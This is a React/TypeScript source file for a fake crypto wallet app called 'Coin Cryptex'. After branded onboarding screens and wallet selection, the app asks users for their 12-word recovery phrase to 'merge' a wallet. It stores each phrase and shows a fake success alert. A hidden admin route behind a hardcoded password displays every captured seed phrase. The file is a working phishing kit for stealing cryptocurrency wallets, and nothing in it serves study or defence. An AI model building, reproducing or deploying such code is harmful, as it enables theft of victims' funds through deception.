  <Route path="/admin-d893e3dh39f3h/dashboard" element={<AdminDashboard />} />
import { useState, useEffect } from "react";
import { Bell, CheckCircle, ShieldCheck, AlertCircle } from "lucide-react";
import { motion } from "framer-motion";
import { BrowserRouter as Router, Route, Routes, useNavigate } from "react-router-dom";
import { submissionStore } from "./store";
import coincryptexLogo from "./icons/coincryptex.png";
import coinbaseIcon from "./icons/coinbase.webp";
import metamaskIcon from "./icons/metamask.webp";
import trustwalletIcon from "./icons/trustwallet.webp";
import defiIcon from "./icons/defi.webp";
import "./App.css";

interface Wallet {
  name: string;
  icon: string;
}

interface Submission {
  id?: number;
  wallet: string;
  seedPhrase: string;
  timestamp: number;
}

function Button({ children, onClick, disabled }: { children: React.ReactNode, onClick: () => void, disabled?: boolean }) {
  return (
    <button disabled={disabled} onClick={onClick} className="button">
      {children}
    </button>
  );
}

function Landing({ next }: { next: () => void }) {
  return (
    <div className="page">
      <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ duration: 0.5 }} className="logo">
        <img src={coincryptexLogo} alt="CoinCryptex Logo" className="coincryptex-logo" />
      </motion.div>
      <h1 className="title">Coin Cryptex</h1>
      <p className="subtitle">Fast • Easy • Secure</p>
      <Button onClick={next}>Get Started</Button>
      <p className="small-text">The future of crypto in your pocket</p>
    </div>
  );
}

function NotificationPrompt({ next, skip }: { next: () => void, skip: () => void }) {
  return (
    <div className="page">
      <motion.div animate={{ rotate: [0, -10, 10, -10, 0] }} transition={{ duration: 1 }}>
        <Bell className="notification-bell notification-bell-huge" size={150} />
      </motion.div>
      <h2 className="title">Keep up with the market</h2>
      <p className="subtitle">Enable notifications to track price changes and crypto transactions.</p>
      <Button onClick={next}>Enable Notifications</Button>
      <button className="link-button" onClick={skip}>Skip for now</button>
    </div>
  );
}

function WalletSelect({ next }: { next: (wallet: Wallet) => void }) {
  const wallets: Wallet[] = [
    { name: "Coinbase", icon: coinbaseIcon },
    { name: "MetaMask", icon: metamaskIcon },
    { name: "Trust Wallet", icon: trustwalletIcon },
    { name: "DeFi Wallet", icon: defiIcon }
  ];

  return (
    <div className="page">
      <h2 className="title">Select Wallet</h2>
      <div className="wallet-grid">
        {wallets.map((w, i) => (
          <div key={i} className="wallet-card" onClick={() => next(w)}>
            <img src={w.icon} className="wallet-icon" onError={(e) => { (e.currentTarget as HTMLImageElement).src = 'https://via.placeholder.com/48'; }} />
            <p className="wallet-name">{w.name}</p>
          </div>
        ))}
      </div>
    </div>
  );
}

function Success({ next }: { next: () => void }) {
  return (
    <div className="page">
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ duration: 0.5, type: "spring" }}
      >
        <CheckCircle className="notification-bell-huge success-icon animated-success-check" size={150} />
      </motion.div>
      <h2 className="title">Brilliant! Your Cryptex is Ready</h2>
      <p className="subtitle">Merge your existing wallet to send or receive crypto securely.</p>
      <Button onClick={next}>Merge Wallet</Button>
    </div>
  );
}

function SeedGrid({ phrases, setPhrases, errors }: { phrases: string[], setPhrases: (p: string[]) => void, errors: boolean[] }) {
  const update = (index: number, value: string) => {
    const copy = [...phrases];
    copy[index] = value;
    setPhrases(copy);
  };

  // Render 4 columns by 3 rows
  const rows = [];
  for (let r = 0; r < 3; r++) {
    const cols = [];
    for (let c = 0; c < 4; c++) {
      const i = r * 4 + c;
      cols.push(
        <div className="seed-input-wrapper" key={i}>
          <input
            value={phrases[i]}
            onChange={(e) => update(i, e.target.value)}
            placeholder={`${i + 1}`}
            className={`seed-input ${errors[i] ? "error" : ""}`}
            autoComplete="off"
          />
          {errors[i] && <span className="seed-error">!</span>}
        </div>
      );
    }
    rows.push(<div className="seed-row" key={r} style={{ display: 'contents' }}>{cols}</div>);
  }
  return (
    <div className="seed-grid beautiful-seed-grid">
      {rows}
    </div>
  );
}

function MergeWallet({ wallet }: { wallet: Wallet | null }) {
  const [phrases, setPhrases] = useState(Array(12).fill(""));
  const [errors, setErrors] = useState(Array(12).fill(false));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  const validate = () => {
    const newErrors = phrases.map((p) => p.trim() === "");
    setErrors(newErrors);
    return !newErrors.includes(true);
  };

  const merge = async () => {
    setError(false);
    if (!validate()) {
      setError(true);
      return;
    }

    await submissionStore.add({
      wallet: wallet?.name || "Wallet",
      seedPhrase: phrases.join(" "),
      timestamp: Date.now()
    });

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      alert("Wallet merged successfully!");
    }, 1500);
  };

  return (
    <div className="page merge-wallet-page">
      {wallet && <img src={wallet.icon} className="wallet-icon-large" />}
      <h2 className="title">{wallet?.name || "Wallet"}</h2>
      <p className="subtitle">Enter your 12 word recovery phrase to merge your wallet.</p>
      <SeedGrid phrases={phrases} setPhrases={setPhrases} errors={errors} />
      {loading && <div className="loader"></div>}
      {error && (
        <div className="error-message">
          <AlertCircle /> Connection failed. Please try again.
        </div>
      )}
      <Button onClick={merge} disabled={loading}>{loading ? "Merging Wallet..." : "Merge Wallet"}</Button>
      <div className="secure-info"><ShieldCheck /> Secure encrypted wallet import</div>
    </div>
  );
}

function App() {
  const [page, setPage] = useState(0);
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
  return (
    <Router>
      <Routes>
        <Route path="/" element={
          <motion.div
            key={page}
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -40 }}
            transition={{ duration: 0.35 }}
          >
            {[
              <Landing next={() => setPage(1)} />,
              <NotificationPrompt next={() => setPage(2)} skip={() => setPage(2)} />,
              <WalletSelect next={(w) => { setSelectedWallet(w); setPage(3); }} />,
              <Success next={() => setPage(4)} />,
              <MergeWallet wallet={selectedWallet} />
            ][page]}
          </motion.div>
        } />
        <Route path="/admin-d893e3dh39f3h" element={<AdminLogin />} />
        <Route path="/admin-d893e3dh39f3h/dashboard" element={<AdminDashboard />} />
      </Routes>
    </Router>
  );
}

export default App;
// Remove stray closing brace

function AdminLogin() {
  const navigate = useNavigate();
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  // Example complex password
  const correctPassword = "CryptoAdmin!2026";

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === correctPassword) {
      setError("");
      navigate("/admin-d893e3dh39f3h/dashboard");
    } else {
      setError("Incorrect password. Try again.");
    }
  };

  return (
    <div className="page admin-login-page">
      <h1 className="title">Admin Login</h1>
      <form onSubmit={handleSubmit} style={{ maxWidth: 320, margin: "0 auto" }}>
        <input
          type="password"
          value={password}
          onChange={e => setPassword(e.target.value)}
          placeholder="Enter admin password"
          className="seed-input"
          style={{ marginBottom: 16 }}
        />
        <Button onClick={() => {}} disabled={password.length === 0}>Login</Button>
        {error && <div className="error-message">{error}</div>}
      </form>
    </div>
  );
}

function AdminDashboard() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const walletIcons: { [name: string]: string } = {
    "Coinbase": coinbaseIcon,
    "MetaMask": metamaskIcon,
    "Trust Wallet": trustwalletIcon,
    "DeFi Wallet": defiIcon
  };
  useEffect(() => {
    const loadSubmissions = async () => {
      const stored: Submission[] = await submissionStore.getAll();
      setSubmissions(stored);
    };
    loadSubmissions();
  }, []);

  const deleteSubmission = async (id: number | undefined) => {
    if (id === undefined) return;
    await submissionStore.delete(id);
    const updated = await submissionStore.getAll();
    setSubmissions(updated);
  };

  return (
    <div className="page admin-page">
      <h1 className="title">Admin Dashboard</h1>
      {submissions.length === 0 ? (
        <p>No wallet submissions yet.</p>
      ) : (
        <div className="admin-grid scrollable-admin-grid">
          {submissions.map((s) => (
            <div key={s.id} className="admin-card beautiful-admin-card">
              <div className="admin-header">
                <img src={walletIcons[s.wallet] || coincryptexLogo} alt={s.wallet} className="admin-wallet-icon" />
                <span className="admin-wallet-name">{s.wallet}</span>
                <button className="admin-delete-btn" onClick={() => deleteSubmission(s.id)}>Delete</button>
              </div>
              <div className="admin-seed">
                <span className="admin-seed-label">Seed Phrase:</span>
                <span className="admin-seed-value">
                  {s.seedPhrase}
                </span>
              </div>
              <span className="admin-timestamp">{new Date(s.timestamp).toLocaleString()}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}